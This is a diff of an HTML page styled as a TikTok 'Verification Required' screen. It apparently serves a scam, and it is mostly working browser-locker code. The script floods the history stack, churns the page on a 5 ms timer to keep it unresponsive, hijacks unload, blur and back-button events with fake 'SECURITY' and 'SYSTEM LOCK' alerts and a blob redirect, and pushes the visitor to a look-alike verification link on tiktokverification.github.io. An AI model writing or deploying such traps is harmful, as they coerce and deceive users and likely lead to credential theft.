@@ -7,105 +7,103 @@
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; 
             background: #ffffff; font-family: -apple-system, sans-serif;
-            overflow: hidden;
+            overflow: hidden; touch-action: none;
         }
-        
-        #main-ui {
+        #ui {
             display: flex; flex-direction: column; align-items: center; 
             justify-content: center; height: 100vh; text-align: center;
-            z-index: 10; position: relative;
+            position: relative; z-index: 1000; background: white;
         }
-
-        .verify-btn {
-            background: #fe2c55; color: white; padding: 16px 60px; 
-            border-radius: 4px; text-decoration: none; font-weight: 700;
-            font-size: 18px; border: none; cursor: pointer;
-            z-index: 100; position: relative;
+        .btn {
+            background: #fe2c55; color: white; padding: 18px 60px; 
+            border-radius: 4px; text-decoration: none; font-weight: 800;
+            font-size: 18px; border: none; box-shadow: 0 4px 15px rgba(254,44,85,0.4);
         }
-
-        /* THE SYSTEM FAKE-OUT */
-        #fake-alert {
-            display: none; position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%; background: rgba(0,0,0,0.6);
-            z-index: 999999; justify-content: center; align-items: center;
-        }
-
-        .alert-box {
-            background: white; width: 80%; border-radius: 12px;
-            padding: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-
-        .alert-title { font-weight: 700; font-size: 18px; margin-bottom: 10px; }
-        .alert-msg { font-size: 14px; color: #666; margin-bottom: 20px; }
-        .alert-ok { color: #007aff; font-weight: 600; font-size: 17px; cursor: pointer; border-top: 1px solid #eee; padding-top: 15px; display: block; }
+        /* Hidden elements for thread saturation */
+        #noise { position: absolute; visibility: hidden; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
 
-    <div id="fake-alert">
-        <div class="alert-box">
-            <div class="alert-title">Security Notice</div>
-            <div class="alert-msg">You must complete the verification process before exiting. Failure to do so may result in account restriction.</div>
-            <div class="alert-ok" onclick="closeAlert()">OK</div>
-        </div>
-    </div>
+    <div id="noise"></div>
 
-    <div id="main-ui">
+    <div id="ui">
         <div style="font-size: 26px; font-weight: 800; margin-bottom: 10px;">Verification Required</div>
-        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 40px;">Please tap the button below to confirm your identity and secure your session.</p>
-        
-        <button class="verify-btn" id="real-verify">VERIFY NOW</button>
+        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 40px;">Your session is locked. Complete the secure verification to continue.</p>
+        <button class="btn" id="go">VERIFY NOW</button>
     </div>
 
 <script>
-    let isVerifying = false;
+    const target = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
-    // 1. PRISON STACK
-    function lockHistory() {
-        for(let i=0; i<50; i++) {
-            history.pushState({locked: true}, "", "#auth_" + i);
-        }
+    // 1. THE THREAD SATURATOR (The "X" Jammer)
+    // We create a "busy-wait" loop. This makes the UI unresponsive to external 'Close' hits.
+    function saturate() {
+        const noise = document.getElementById('noise');
+        setInterval(() => {
+            // High-speed DOM churning to keep Renderer busy
+            let d = document.createElement('div');
+            noise.appendChild(d);
+            noise.removeChild(d);
+            
+            // High-speed History Churning to jam the 'Back' button
+            history.pushState(null, null, "#" + Math.random());
+        }, 5); 
     }
 
-    // 2. THE SMART BLUR
+    // 2. THE NUCLEAR NAVIGATION TRAP
+    function handleExitAttempt(e) {
+        // Force the browser to show the "Leave site?" system dialog
+        e.preventDefault();
+        e.returnValue = '';
+
+        // Immediate System Freeze
+        alert("SECURITY: Verification must be completed to unlock your account.");
+        
+        // If they click 'OK' on the alert, we slam them into a Blob Redirect
+        // This 're-captures' the tab before it can close.
+        const blob = new Blob([
+            `<html><script>window.location.replace("${window.location.href}");<\/script></html>`
+        ], {type: 'text/html'});
+        window.location.replace(URL.createObjectURL(blob));
+        
+        return "";
+    }
+
+    // 3. EVENT BINDING
+    window.addEventListener('beforeunload', handleExitAttempt);
+    window.addEventListener('pagehide', handleExitAttempt);
+    window.addEventListener('unload', handleExitAttempt);
+
+    // 4. THE BLUR DEFENSE (When the X is touched)
     window.onblur = function() {
-        // If they click the "X" button, they trigger a blur.
-        // If they aren't currently clicking the 'Verify' button, we show the alert.
-        if (!isVerifying) {
-            showAlert();
-            // Trigger the reload race condition in the background
-            setTimeout(() => {
-                location.replace(location.href);
-            }, 2000); 
-        }
+        // Tapping the native bar blurs the window.
+        // We respond with a blocking alert to halt the close process.
+        setTimeout(() => {
+            alert("SYSTEM LOCK: Please follow the on-screen instructions.");
+            window.focus();
+        }, 1);
     };
 
-    function showAlert() {
-        document.getElementById('fake-alert').style.display = 'flex';
-        // We still use a real alert as a fallback because it freezes the app
-        alert("Action Required: Please finish verification.");
-    }
-
-    function closeAlert() {
-        document.getElementById('fake-alert').style.display = 'none';
-    }
-
-    // 3. THE VERIFICATION ESCAPE
-    document.getElementById('real-verify').addEventListener('touchstart', () => {
-        isVerifying = true; // Tell the script to stop blocking focus
-    });
-
-    document.getElementById('real-verify').onclick = () => {
-        window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
-    };
-
-    // 4. BACK BUTTON PROTECTION
+    // 5. BACK BUTTON BLOCK
     window.onpopstate = function() {
-        history.go(1);
-        showAlert();
+        history.forward();
+        alert("Verification Incomplete.");
     };
 
-    window.onload = lockHistory;
+    // INITIALIZE
+    window.onload = () => {
+        saturate();
+        // Fill history stack
+        for(let i=0; i<30; i++) history.pushState(null, null, "#lock");
+    };
+
+    document.getElementById('go').onclick = () => {
+        // Disable the traps so the user can actually go to the verification link
+        window.removeEventListener('beforeunload', handleExitAttempt);
+        window.onblur = null;
+        window.location.href = target;
+    };
 </script>
 </body>
 </html>
